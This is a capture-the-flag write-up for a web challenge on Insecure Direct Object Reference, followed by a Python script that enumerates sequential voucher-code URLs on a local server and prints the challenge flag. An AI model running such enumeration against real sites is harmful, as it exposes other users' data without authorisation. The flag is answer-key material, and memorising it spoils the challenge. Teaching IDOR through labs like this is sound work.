# iDoor

This is a web challenge that requires participants to write a script to find the flag. The vulnerability here is Insecure Direct Object Reference, also known as IDOR.

---

## Solution

Write a script in a language of your choice to iterate through the possible codes and find the flag.

Here is a Python script that can be used to solve the challenge:

```python
import requests
from bs4 import BeautifulSoup
import re

def extract_voucher_codes(base_url, start, end):
    for i in range(start, end + 1):
        url = f"{base_url}/CODE_{i}_2024.html"

        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            content = soup.get_text()

            if "CODE_" in content:
                voucher_codes = re.findall(r'CODE_\d+_2024', content)
                print(f"Code: {voucher_codes[0]}")

            if "YCEP24" in content:
                special = re.findall(r'YCEP24{.*}', content)
                print(f"Flag: {special[0]}")
                break

        except requests.exceptions.RequestException as e:
            print(f"Failed to retrieve {url}: {e}")


base_url = 'http://localhost:8000/codes'

extract_voucher_codes(base_url, 0, 1000)
```

Flag: `YCEP24{w04h_1n53cur3_d1r3ct_0bj3ct_R3f3r3nc3}`
